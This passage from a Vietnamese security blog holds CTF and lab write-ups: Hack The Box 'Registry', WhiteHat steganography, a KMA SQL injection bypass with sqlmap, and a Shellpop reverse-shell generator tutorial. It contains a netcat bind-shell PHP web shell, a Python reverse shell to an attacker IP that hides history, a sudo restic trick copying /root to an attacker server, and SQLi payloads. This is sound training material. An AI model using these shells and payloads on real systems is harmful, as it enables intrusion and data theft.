","title":"Reflected XSS in ATutor 2.2.4"},{"content":"Tả thực Vào một ngày đẹp trời (à thực ra thì cũng không đẹp lắm, trời vừa mưa vừa rét chả đi chơi được đâu) thì có người bạn mình trong team bảo chơi hackthebox và đang có lỗi. Được cái mình cũng nhiệt tình + phá hoại nên vào giúp tý cho vui.\nStart Recon ➜ ~ ./nmapAutomator.sh 10.10.10.159 all Running a all scan on 10.10.10.159 Host is likely running Linux ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 15:50 +07 Nmap scan report for 10.10.10.159 Host is up (0.20s latency). Not shown: 905 closed ports, 92 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 5.22 seconds ---------------------Starting Nmap Basic Scan--------------------- Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 15:50 +07 Nmap scan report for 10.10.10.159 Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA) | 256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA) |_ 256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title. 443/tcp open ssl/http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title. | ssl-cert: Subject: commonName=docker.registry.htb | Not valid before: 2019-05-06T21:14:35 |_Not valid after: 2029-05-03T21:14:35 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.38 seconds Thấy đoạn\nssl-cert: Subject: commonName=docker.registry.htb Sửa /etc/hosts thêm đoạn\n10.10.10.159 docker.registry.htb registry.htb Sử dụng gobuster recon thư mục\ngobuster dir -u http://docker.registry.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l 40 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://docker.registry.htb [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Show length: true [+] Timeout: 10s =============================================================== 2020/02/10 16:09:49 Starting gobuster =============================================================== /v2 (Status: 301) [Size: 39] Thấy có thư mục /v2 báo 301 thì trang này có gắn basic auth. Thử nhập admin:admin vào thì được :v. Ăn may xíu thôi. Sau khi nhập được basic auth thì ở docker có thư mục _catalog để kiểm tra có image gì trong đấy. Lấy cờ User Vậy là ta biết được image tên là gì rồi thì mình pull docker về xem sao.\nNhưng trong lúc mình pull docker về thì gặp lỗi này\nminhtuan@kali:~$ sudo docker pull docker.registry.htb/bolt-image Using default tag: latest Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority Hóa ra là mình chưa có certificate. Vậy thì update certificate thủ công thôi Vào https://docker.registry.htb tải file .crt về copy file đấy vào\n/usr/local/share/ca-certificates sudo update-ca-certificates sudo service docker restart minhtuan@kali:~$ sudo docker login https://docker.registry.htb Username: admin Password: WARNING! Your password will be stored unencrypted in /root/.docker/config.json. Configure a credential helper to remove this warning. See https://docs.docker.com/engine/reference/commandline/login/#credentials-store Login Succeeded Thành công, lúc này ta có thể pull docker về và sử dụng bình thường rồi.\n➜ ~ docker pull docker.registry.htb/bolt-image Using default tag: latest latest: Pulling from bolt-image Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b Status: Image is up to date for docker.registry.htb/bolt-image:latest docker.registry.htb/bolt-image:latest Pull về xong rồi thì chui vào thôi\n➜ ~ docker run --rm -it docker.registry.htb/bolt-image:latest root@9818304f783b:/# Kinh nghiệm của mình là cứ tập trung vào những folder nào nó cực kỳ nhạy cảm như ssh, rồi mấy thư mục user, /var/www/html xem có gì không. Lục mãi thì trong thư mục /root/.ssh có file private key ssh. Mừng huýnh rồi sử dụng ssh2john.py và john brute force lấy pass private key nhưng mà k được. Nên mình quay lại docker xem bên trong còn gì nữa không. Sau một hồi tìm kiếm lùng sục thì mình thấy có 1 file này ở đây.\nroot@9818304f783b:/etc/profile.d# cat 01-ssh.sh #!/usr/bin/expect -f #eval `ssh-agent -s` spawn ssh-add /root/.ssh/id_rsa expect \u0026#34;Enter passphrase for /root/.ssh/id_rsa:\u0026#34; send \u0026#34;GkOcz221Ftb3ugog\\n\u0026#34;; expect \u0026#34;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)\u0026#34; interact Vậy đây là đoạn chương trình tạo khóa private key. Mật khẩu file id_rsa kia là GkOcz221Ftb3ugog. Việc còn lại là mình ssh vào machine thôi.\n➜ registry ssh -i id_rsa root@10.10.10.159 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: root@10.10.10.159\u0026#39;s password: K được. Cơ mà mình hơi ngây thơ, ssh vào root thì bài này đã dễ quá =)). Xong mình nhìn lại cái tên image docker là bolt-image. Thử sử dụng user ssh là bolt xem sao.\n➜ registry ssh -i id_rsa bolt@10.10.10.159 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64) System information as of Mon Feb 10 09:35:17 UTC 2020 System load: 0.0 Users logged in: 1 Usage of /: 5.7% of 61.80GB IP address for eth0: 10.10.10.159 Memory usage: 32% IP address for br-1bad9bd75d17: 172.18.0.1 Swap usage: 0% IP address for docker0: 172.17.0.1 Processes: 173 Last login: Mon Feb 10 09:06:21 2020 from 10.10.16.7 bolt@bolt:~$ user.txt cat user.txt và submit lên thôi :v\nLấy cờ Root Mình sử dụng private key để đăng nhập vào ssh của bolt nên mình chưa thể sử dụng sudo right để leo thang đặc quyền được vì khi gõ sudo -l hệ thống sẽ yêu cầu nhập mật khẩu của bolt. Mình đã sử dụng LinEnum.sh để khai thác ở user bolt này nhưng chưa thu được kết quả gì. Thử đủ loại exploit mà k lên được root. Điều khiến cho mình tập trung tiếp là vào phần web. Mình tìm thấy được trong thư mục web có thư mục /bolt thì mình thử vào xem sao. Trang này được tạo bởi Bolt CMS, là 1 opensource. Mình đọc trên doc thì thấy chỗ login https://docs.bolt.cm/3.7/manual/login là /login nhưng mà thử thì lại bắn ra lỗi 404. Xong rồi mình thử lại là http://registry.htb/bolt/bolt thì lại vào được trang login (nani, chả hiểu kiểu gì). Công cuộc tiếp theo thì tìm kiếm account admin đăng nhập vào đây thôi. Lục tiếp trong folder /var/www/html/bolt thì có 1 file db\nbolt@bolt:/var/www/html/bolt/app/database$ ls bolt.db bolt@bolt:/var/www/html/bolt/app/database$ file bolt.db bolt.db: SQLite 3.x database, last written using SQLite version 3022000 Check file thì đây là 1 file db SQLite 3. Tiếc là trên machine lại k có sqlite3 nên mình copy file này về máy để kiểm tra. Sử dụng scp để copy file bolt.db về máy mình\n➜ registry scp -i id_rsa bolt@10.10.10.159:/var/www/html/bolt/app/database/bolt.db . Sau khi đã copy xong file thì mình chui vào xem trong đó có gì, mình tìm thấy tài khoản admin ở trong bảng bolt_users\n➜ registry sqlite3 bolt.db SQLite version 3.31.0 2019-12-29 00:52:41 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .table bolt_authtoken bolt_field_value bolt_pages bolt_users bolt_blocks bolt_homepage bolt_relations bolt_cron bolt_log_change bolt_showcases bolt_entries bolt_log_system bolt_taxonomy sqlite\u0026gt; select * from bolt_users ...\u0026gt; ; 1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2020-02-09 23:27:11|10.10.15.117|Admin|[\u0026#34;themes://basic.php\u0026#34;,\u0026#34;themes://rev.php\u0026#34;,\u0026#34;themes://base-2018/meh.twig\u0026#34;,\u0026#34;themes://meh.twig\u0026#34;,\u0026#34;themes://shell.php\u0026#34;]|1||||0||[\u0026#34;root\u0026#34;,\u0026#34;everyone\u0026#34;] sqlite\u0026gt; Sử dụng john để crack passwd admin ra được passwd là strawberry, đăng nhập vào http://registry.htb/bolt/bolt Ở đây có 1 trình upload file, ta thử upload file shell lên đây nhưng mà nó k cho upload file php lên. Ta sửa 1 chút config ở đây để server cho phép upload file php Sau đấy ta lưu lại rồi chuyển sang chức năng upload đẩy shell lên. Ban đầu mình sử dụng https://github.com/flozz/p0wny-shell nhưng mà mình k thể reverse shell lại máy mình được, dường như là ở đây cấu hình firewall chặn kết nối ra ngoài. Viết đủ thể loại shell php upload lên nhưng mà k được, nên mình nghĩ đến là sử dụng máy mình reverse shell lên máy chủ. Sử dụng file shell.php \u0026lt;?php system(\u0026#34;nc.traditional -lvp 4444 -e /bin/bash\u0026#34;); \nUpload lên rồi bên máy mình sử dụng lệnh\n➜ registry nc -nv 10.10.10.159 4444 (UNKNOWN) [10.10.10.159] 4444 (?) open Upgrade shell\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Đến đây rồi lại tiếp tục sử dụng LinEnum.sh để kiểm tra xem có gì không thì mình thấy cái này\n[+] We can sudo without supplying a password! Matching Defaults entries for www-data on bolt: env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bolt: (root) NOPASSWD: /usr/bin/restic backup -r rest* Tập trung hết cơm gạo vào phần này để lấy root =)).\nGiới thiệu sơ qua một chút, restic là 1 opensource sử dụng để backup, nói rõ hơn thì mình cũng chịu vì cái này quá mới so với mình =)), chả biết gì cả.\nNgồi đọc document của nó tại đây https://restic.readthedocs.io/en/latest/ Sau một khoảng thời gian đọc doc với lên mạng tìm exam câu lệnh của nó thì mới biết là nó cần 1 server để backup. Người bạn chơi cùng mình bảo là nó có 1 restic server, nó tự động chạy trên cổng 8000. Mình ngồi tải file binary của nó ở đây https://github.com/restic/rest-server/releases\n➜ Downloads ./rest-server-0.9.7-linux-amd64 rest-server 0.9.7 compiled with go1.10 on linux/amd64 Data directory: /tmp/restic Authentication disabled Private repositories disabled Starting server on :8000 Chạy server xong thì tạo repo restic để lưu file backup\n➜ Downloads apt-get install restic ➜ Downloads restic init -r /tmp/restic enter password for new repository: enter password again: created restic repository 03ab053496 at /tmp/restic Please note that knowledge of your password is required to access the repository. Losing your password means that your data is irrecoverably lost. Điều cần làm bây giờ là ánh xạ cổng 8000 từ máy mình lên machine cũng trên cổng 8000 luôn cho nhanh (thực ra cho dễ nhớ =))). Sử dụng ssh ánh xạ qua user bolt. À mà ban đầu mình dùng www-data nhưng mà chả hiểu ánh xạ lên kiểu gì, biết mỗi ánh xạ qua ssh thì dùng qua thằng bolt luôn. Nhưng chẳng hiểu kiểu gì thằng www-data cũng xài được luôn. Nghĩ ngẫm 1 hồi hóa ra là nó chạy trên quyền root cái lệnh restic =)).\n➜ registry ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@10.10.10.159 Sử dụng restic với quyền sudo backup thư mục /root\nwww-data@bolt:~/html$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000 /root \u0026lt;n/restic backup -r rest:http://127.0.0.1:8000 /root enter password for repository: 123123 password is correct found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them scan [/root] scanned 10 directories, 14 files in 0:00 [0:01] 100.00% 28.066 KiB / 28.066 KiB 24 / 24 items 0 errors ETA 0:00 duration: 0:01 snapshot e5ef88b3 saved www-data@bolt:~/html$ Ngon, lưu snapshot được về máy mình rồi, điều quan trọng giờ là tìm lệnh để đọc nó ra thôi. Ngồi cat mấy cái folder trong /tmp/restic mà nó mã hóa hết luôn, nhìn như kiểu blockchain =)), sợ vl. Ngồi đọc doc thấy đoạn này, hóa ra là nó dùng restore chứ nó đếch đọc được kiểu bt =)).\n➜ restic restic -r /tmp/restic restore e5ef88b3 --target /tmp/restic-root enter password for repository: repository 03ab0534 opened successfully, password is correct restoring \u0026lt;Snapshot e5ef88b3 of [/root] at 2020-02-10 06:26:17.454661805 +0000 UTC by root@bolt\u0026gt; to /tmp/restic-root Xong rồi, vào /tmp/restic-root mà đọc cờ cuối thôi ;))\n➜ restic cd /tmp/restic-root ➜ restic-root ;s zsh: command not found: s ➜ restic-root ls root ➜ restic-root cd root ➜ root ls config.yml cron.sh root.txt Funfact  Cay 1   Cay 2: Thề luôn chả biết cái gì thằng restic, khai thác machine này khá khó đối với mình. Cay 3: Đang suy nghĩ nhưng khá là cay.  Thanks  Nguyen Van Khanh B Nguyen Xuan Hoa  ","permalink":"https://minhtuanact.github.io/content/post/writeup-htb-registry/","summary":"Tả thực Vào một ngày đẹp trời (à thực ra thì cũng không đẹp lắm, trời vừa mưa vừa rét chả đi chơi được đâu) thì có người bạn mình trong team bảo chơi hackthebox và đang có lỗi. Được cái mình cũng nhiệt tình + phá hoại nên vào giúp tý cho vui.\nStart Recon ➜ ~ ./nmapAutomator.sh 10.10.10.159 all Running a all scan on 10.10.10.159 Host is likely running Linux ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.","title":"Writeup Htb Registry"},{"content":"Misc 01 (Point: 360) File các bạn có thể download tại đây File\nĐầu tiên thì đây là file png, sử dụng zsteg xem bên trong này có gì không. Thấy có 1 file ảnh nữa và 1 đoạn Comment Find the password to get the colors using stego tool. Extract file ảnh ra xem có gì bên trong\n➜ misc01 zsteg -e \u0026#34;extradata:0\u0026#34; Trip_to_Hoi_An.png \u0026gt; qr.png Ta extract ra được 1 file qr. Mình được 1 người anh trong team viết cho đoạn code replace mấy điểm trong cái mã QR này rồi khôi phục lại được mã QR ban đầu. Code: from PIL import Image im = Image.open(\u0026#39;qr (1).png\u0026#39;) w, h = im.size print(w, h) rgb_im = im.convert(\u0026#39;RGB\u0026#39;) im1 = Image.new(im.mode, (100, 100), \u0026#34;white\u0026#34;) OFFSET = 5 arr = [] for row in range(int(h/7+1)): tmp = [] for col in range(int(w/7+1)): print((3 + row*7, col*7 + 3)) color = rgb_im.getpixel((3 + row*7, col*7 + 3)) if color != (221, 140, 255): a = 0 im1.putpixel((row + 1, col + 1), (0, 0, 0)) else: a = 1 im1.putpixel((row + 1, col + 1), (255, 255, 255)) tmp.append(a) arr.append(tmp) print(arr) im1.save(\u0026#39;out2.png\u0026#39;)\nQuét mã QR ta thu được một đoạn text The password for this picture is: RGB\nVậy mật khẩu của bức ảnh là RGB. Mình đã thử mấy tools như steghide nhưng mà steghide không hỗ trợ file PNG, và anh teamlead của mình nhắn bảo thử stegosuite xem, thì cũng chạy đi thử, cơ mà stegosuite không hỗ trợ PNG, đành phải convert file PNG sang BMP rồi ném password vào thử. Extract thành công được 1 đoạn text được giấu vào đây.\nHere is your colors: 1196, 152 818, 504 167, 465 1424, 680 786, 309 448, 383 1198, 302 187, 43 341, 280 27, 477 Đây chính là tọa độ lấy mã màu trong bức ảnh kia. Viết 1 đoạn code để lấy flag thôi nào.\nfrom PIL import Image im = Image.open(\u0026#39;Trip_to_Hoi_An.png\u0026#39;) w, h = im.size code = [\u0026#39;1196, 152\u0026#39;, \u0026#39;818, 504\u0026#39;, \u0026#39;167, 465\u0026#39;, \u0026#39;1424, 680\u0026#39;, \u0026#39;786, 309\u0026#39;, \u0026#39;448, 383\u0026#39;, \u0026#39;1198, 302\u0026#39;, \u0026#39;187, 43\u0026#39;, \u0026#39;341, 280\u0026#39;, \u0026#39;27, 477\u0026#39;] print(w, h) listcode = [] for i in code: listcode.append(im.getpixel((int(i.split(\u0026#39;, \u0026#39;)[0]), int(i.split(\u0026#39;, \u0026#39;)[1])))) flag = [] for i in listcode: [flag.append(chr(i[s])) for s in range(3)] print \u0026#39;\u0026#39;.join(flag)  Flag WhiteHat{sha1(w3LC0m3_t0_HOI_AN_4nc13nt_t0wn)}\n Misc 03 (Point: 280) Cái bài này thì độ khốn nạn khỏi nói rồi. Để mình cho các bạn xem cái độ khốn nạn của bài này nó đến đâu nhé. Ảnh các bạn có thể tải tại đây file\nVẫn là ảnh png, chúng ta lại sử dụng zsteg để tìm thử xem trong ảnh này có gì không.\nVẫn là có 1 file nữa trong ảnh này, extract ra ngoài xem nó là gì nào.\n➜ misc03 zsteg -e \u0026quot;extradata:0\u0026quot; pied_piper.png \u0026gt; file ➜ misc03 file file file: data Chả biết nó là cái file quần què gì cả, đúng là phải theo phương pháp tâm linh, đoán ra file này được mã hóa bằng XOR, thử bruteforce xem có được ra cái quần què gì không. Sử dụng xortools như sau\n➜ misc03 xortool -l 1 -b file 256 possible key(s) of length 1: F G D E B ... Found 0 plaintexts with 95.0%+ valid characters See files filename-key.csv, filename-char_used-perc_valid.csv Kiểm tra trong thư mục out thì ta thấy 1 file ảnh PNG, đúng là phương pháp tâm linh thật =))\nNhìn quả mã hóa kiểu này thì mình cứ chui vào cái trang https://www.dcode.fr/ này ngó xem cái nào giống k. Thì tìm được cái mã hóa này https://www.dcode.fr/pigpen-cipher. Xong rồi, decode bằng cơm ta sẽ có flag.\n","permalink":"https://minhtuanact.github.io/content/post/writeup-whitehat-2020/","summary":"Misc 01 (Point: 360) File các bạn có thể download tại đây File\nĐầu tiên thì đây là file png, sử dụng zsteg xem bên trong này có gì không. Thấy có 1 file ảnh nữa và 1 đoạn Comment Find the password to get the colors using stego tool. Extract file ảnh ra xem có gì bên trong\n➜ misc01 zsteg -e \u0026#34;extradata:0\u0026#34; Trip_to_Hoi_An.png \u0026gt; qr.png Ta extract ra được 1 file qr.","title":"[Writeup] Whitehat Grand Prix 06 - 2020"},{"content":"Bạn đã chán cảnh lưu lại các lệnh shell trên máy tính của mình, và bạn đã mệt mỏi khi đi tìm chúng ở đâu mỗi khi mình cần. Để giải quyết việc này, Shellpop được sinh ra với vô vàn các tiện ích mà nó đem lại, giờ đây bạn sẽ không cần phải lưu lại và đi tìm các lệnh shell mỗi khi cần nữa.\nAbout Công cụ này được phát triển bởi Andre Marques và đây là một mã nguồn mở nên ai có bất kỳ ý tưởng nào hay ho thì tham gia vào cùng phát triển nhé\nGithub: https://github.com/0x00-0x00/ShellPop\nCài đặt Chương trình bắt buộc cài Python 2.7\nĐầu tiên chúng ta cần phải clone git về\ngit clone https://github.com/0x00-0x00/ShellPop.git Tiếp theo gõ lệnh cd Shellpop/\nThực hiện cài đặt các dịch vụ bắt buộc\nroot@kali# apt-get install python-argcomplete metasploit-framework -y root@kali# pip install -r requirements.txt Bắt đầu cài đặt\nroot@kali# python setup.py install Vậy là ta đã cài đặt xong, bắt đầu vào sử dụng thôi.\nSử dụng root@kali:~/Documents/ShellPop# shellpop --help usage: shellpop [-h] [-l] [-H HOST] [-P PORT] [--number NUMBER] [--shell SHELL] [--reverse] [--bind] [--payload PAYLOAD] [--xor] [--base64] [--urlencode] [--ipfuscate] [--obfuscate-small] [--handler] [--stager STAGER] [--http-port HTTP_PORT] [--powershell-x86] [--powershell-x64] [--powershell-random-case] [--clip] Options: -h, --help show this help message and exit -l, --list List of available shells -H HOST, --host HOST IP to be used in connectback (reverse) shells. -P PORT, --port PORT Port to be used in reverse/bind shell code. --number NUMBER Shell code index number --shell SHELL Terminal shell to be used when decoding some encoding scheme. --handler Use handler, if possible. Shell Types: --reverse Victim communicates back to the attacking machine. --bind Open up a listener on the victim machine. --payload PAYLOAD Choose the payload Encoders Options: --xor Enable XOR obfuscation --base64 Encode command in base64. --urlencode Encode the command in URL encoding. Obfuscation Options: --ipfuscate Obfuscate IP address. --obfuscate-small Obfuscated command will be as small as possible. Staging Options: --stager STAGER Use staging for shells --http-port HTTP_PORT HTTP staging port to be used PowerShell options: --powershell-x86 Use powershell 32-bit executable. --powershell-x64 Use powershell 64-bit executable. --powershell-random-case Use random-case in powershell payloads. Miscellaneous: --clip Copy payload to your clipboard automatically. Pop shells like a master. For more help visit:https://github.com/0x00-0x00/ShellPop Danh sách shell Shellpop cung cấp cho ta khá nhiều tiện ích, bạn có thể liệt kê tất cả các shell của shellpop bằng cách sử dụng tùy chọn lệnh \u0026ndash;list Ví dụ:\nroot@kali:~/Documents/ShellPop# shellpop --list shellpop v0.36 Contributors: @zc00l,@touhidshaikh,@lowfuel [+] Bind shells: 1. Python TCP +pty 2. Python UDP 3. Perl TCP 4. Perl UDP 5. PHP TCP 6. PHP UDP 7. Ruby TCP 8. Ruby UDP 9. Netcat (OpenBSD) TCP 1. Netcat+coproc (OpenBSD) UDP 2. Netcat (Traditional) TCP 3. AWK TCP 4. socat UDP 5. Windows Powershell TCP 6. Windows Powershell Nishang TCP [+] Reverse shells: 1. Python TCP +pty 2. Python UDP 3. PHP TCP 4. Ruby TCP 5. Perl TCP 01 6. Perl TCP 02 7. Perl UDP [nc -lkvup PORT] 8. Bash TCP 9. Windows Powershell TCP 10. TCLsh TCP 11. Ncat TCP 12. Ncat SSL TCP 13. Netcat (Traditional) UDP 14. Netcat (Traditional) TCP 15. Netcat (OpenBSD) mkfifo TCP 16. Netcat (OpenBSD) mknod TCP 17. Telnet mkfifo TCP 18. Telnet mknod TCP 19. openssl TCP 20. socat TCP 21. awk TCP 22. awk UDP 23. Windows Bat2Ncat TCP 24. Windows Powershell Shellcode-Injection a.k.a BloodSeeker TCP - x64 25. Windows Powershell Tiny TCP 26. Windows Powershell Nishang TCP 27. Windows Powershell Nishang ICMP 28. Windows Bat2Meterpreter TCP 29. Groovy TCP Ở đây chúng ta thấy được là shellpop hỗ trợ đủ loại ngôn ngữ từ Python, PHP, Ruby, Perl cho đến Windows Powershell, \u0026hellip; Shellpop còn hỗ trợ cả TCP, UDP, ICMP, \u0026hellip;\nSao chép vào clipboard Shellpop sẽ không cho bạn lãng phí một giây phút nào cả (vì mục đích của chương trình này được tạo ra là giúp người dùng không lãng phí thời gian mà). Với tùy chọn --clip, ngay lập tức shell mà bạn vừa tạo ra sẽ được sao chép vào clipboard của bạn rồi. Việc của bạn chỉ việc paste ra mà thôi.\nBind shells và Reverse shells Chúng ta tập trung vào 2 vấn đề chính là Bind shells và Reverse shells\nChúng ta thử tạo 1 reverse shells xem sao nhé\nỞ đây mình tạo 1 Reverse Shell ở IP trên eth0 và cổng 4444 Command line examples\nroot@kali:~# shellpop --host eth0 --port 4444 --reverse --number 1 [+] Execute this code in remote target: python -c \u0026#34;import os;import pty;import socket;jbNZvh=\u0026#39;192.168.19.100\u0026#39;;GCVfMeJlExfIfs=4444;ugQNFu=socket.socket(socket.AF_INET,socket.SOCK_STREAM);ugQNFu.connect((jbNZvh,GCVfMeJlExfIfs));os.dup2(ugQNFu.fileno(),0);os.dup2(ugQNFu.fileno(),1);os.dup2(ugQNFu.fileno(),2);os.putenv(\u0026#39;HISTFILE\u0026#39;,\u0026#39;/dev/null\u0026#39;);pty.spawn(\u0026#39;/bin/bash\u0026#39;);ugQNFu.close();\u0026#34; [+] This shell DOES NOT have a handler set.  shellpop: gọi chương trình shellpop --host: Xác định địa chỉ đích --port: Xác định cổng --reverse: Chọn tùy chọn reverse --number: Xác định kiểu mà mình muốn tạo shell, với số thứ tự ở tùy chọn --list bên trên.  Tự động hoàn thành Với chức năng này, bạn có thể quên luôn cái --list, --number kia đi, dưới đây là ví dụ cho các bạn hiểu. Chỉ cần bám vào đối số của --payload là bạn có thể tự tạo cho mình 1 shell mong muốn rồi.\nMã hóa Hiện tại chương trình cung cấp 3 loại mã hóa là XOR, Base64 và URL. Chúng ta có thể sử dụng từng loại mã hóa hoặc có thể \u0026ldquo;mix\u0026rdquo; nhiều loại với nhau.\nVí dụ: Handlers Tùy chọn này giúp bạn giảm thiểu tối đa việc tạo và connect shell. Ví dụ: Tổng kết Shellpop là một công cụ tuyệt vời cho những bài pentest. Còn rất nhiều tiện ích hay mà công cụ đem lại, bạn đọc tìm hiểu dần dần nhé. Nếu thấy bài viết hữu ích thì để lại 1 share 1 upvote để mình có động lực ra các bài viết hay hơn nhé.\n","permalink":"https://minhtuanact.github.io/content/post/tao-vo-van-lenh-shell-chiem-quyen-truy-cap-bang-cong-cu-shellpop-tren-linux/","summary":"Bạn đã chán cảnh lưu lại các lệnh shell trên máy tính của mình, và bạn đã mệt mỏi khi đi tìm chúng ở đâu mỗi khi mình cần. Để giải quyết việc này, Shellpop được sinh ra với vô vàn các tiện ích mà nó đem lại, giờ đây bạn sẽ không cần phải lưu lại và đi tìm các lệnh shell mỗi khi cần nữa.\nAbout Công cụ này được phát triển bởi Andre Marques và đây là một mã nguồn mở nên ai có bất kỳ ý tưởng nào hay ho thì tham gia vào cùng phát triển nhé","title":"Tạo Vô Vàn Lệnh Shell Chiếm Quyền Truy Cập Bằng Công Cụ Shellpop Trên Linux"},{"content":"Mở đầu  Vừa rồi có 1 cuộc thi KMA CTF dành cho sinh viên. Mình cũng được tiếp xúc với 1 bài Web dính SQL Injection  Đề bài \u0026lt;?php include \u0026#34;config.php\u0026#34;; function check_input($input) { $charset = \u0026#34;~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026amp;\\()*+,-./:;\u0026lt;=\u0026gt;?@[]^_`{|}\u0026#34;; if (empty($input)) return false; for ($i = 0 ; $i \u0026lt; strlen($input); $i++) if(!strpos($charset,$input[$i])) return false; return true; } if(isset($_POST[\u0026#34;search_user_exist\u0026#34;])) { $username = $_POST[\u0026#34;username\u0026#34;]; $name = $_POST[\u0026#34;name\u0026#34;]; \u0026#34;hl_lines=5-6\u0026#34; if ( check_input($username) === false || check_input($name) === false) { die(\u0026#34;h4x0r detected\u0026#34;); } $sql = \u0026#34;SELECT id FROM users WHERE username=\u0026#39;$username\u0026#39; or name=\u0026#39;$name\u0026#39;\u0026#34;; $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { die(\u0026#34;User exist\u0026#34;); } die(\u0026#34;No user\u0026#34;); } else { highlight_file(__FILE__); } ?\u0026gt; (Đề bài đã được custom 1 chút so với đề của KMA CTF)\nXác định cách thức tấn công   Đọc code ta có thể thấy được có 1 chức năng search_user_exist dùng để search xem đã tồn tại username hay name hay chưa. Nhưng để ý đoạn câu lệnh querry thì chắc chắn chỗ này dính sql injection. Nhưng làm thế nào để khai thác, mình phải vượt qua được đoạn function check_input kia đã.\n  Theo function check_input thì chỉ cho phép $charset = \u0026#34;~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026amp;\\()*+,-./:;\u0026lt;=\u0026gt;?@[]^_`{|}\u0026#34;;  Vậy là chương trình chặn ký tự ', space, và chặn cả ~.\nVậy tại sao chặn cả dấu ~, mình thấy nó trong charset mà :-?\nLí giải cho điều này vì hàm strpos($charset,$input[$i]); nó sẽ tìm vị trí xuất hiện đầu tiên của $input[$i] trong charset. Do ~ đứng đầu chuỗi charset. Vậy khi tìm dấu ~, nó sẽ trả về giá trị 0. Và trong lệnh if thì if(!0) = true. Vậy nó vô tình lọc cả ký tự ~.\n  Xác định được các ký tự nào được phép qua thì mình bypass qua câu lệnh query này thôi. Sau một hồi tìm hiểu thì trong SQL dấu ' được thay bằng dấu \\, dấu space được thay bằng /**/. Vậy muốn bypass được câu lệnh luôn đúng thì như thế nào:\nSELECT id FROM users WHERE username=\u0026#39;\\\u0026#39; or name=\u0026#39;OR/**/1=1#\u0026#39;  Nó tương đương với câu lệnh\nSELECT id FROM users WHERE username=''' or name='OR 1=1 Sẽ trả về mệnh đề luôn đúng.\n  Ta đã xác định được username=\\, name=OR/**/1=1#\n  Sử dụng sqlmap   Vậy bây giờ ta sẽ tấn công như thế nào. Đây là Blind SQL Injection. Khi câu lệnh query đúng thì nó sẽ trả về User exist. Khi câu lệnh sai nó trả về No user. Khi có ký tự k thuộc charset nó trả về h4x0r detected.\n  Đầu tiên ta sẽ truyền data cho sqlmap để sqlmap hiểu được\nCâu lệnh:\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026#34;search_user_exist\u0026amp;username=\\\u0026amp;name=OR/**/1=1#\u0026#34;   sqlmap báo lỗi k thể injection được. Vậy phải giải quyết như thế nào.\n  Do đây là Blind SQL Injection nên sqlmap sẽ không biết được đâu là câu lệnh query đúng, đâu là câu lệnh query sai, nên sqlmap không tìm được gì. Sử dụng câu lệnh --string để xác định 1 phần văn bản trả về là đúng. Tức là responce trả về có đoạn văn bản giống như vậy thì sqlmap sẽ hiểu câu lệnh đó đang đúng.\nCâu lệnh:\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026#34;search_user_exist\u0026amp;username=\\\u0026amp;name=OR/**/1=1#\u0026#34; --string=\u0026#34;User exist\u0026#34;   Vẫn k được, trong sqlmap có option -v để xem được chi tiết các payload sử dụng, request như thế nào, kết quả responce ra làm sao. Ở đây mình sẽ dùng cấp độ thứ 6 để kiểm tra kết quả mà sqlmap đẩy lên đúng chưa.\nCâu lệnh:\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026#34;search_user_exist\u0026amp;username=\\\u0026amp;name=OR/**/1=1#\u0026#34; --string=\u0026#34;User exist\u0026#34; -v 6 [16:50:19] [PAYLOAD] OR/**/1=1#\u0026#39; AND 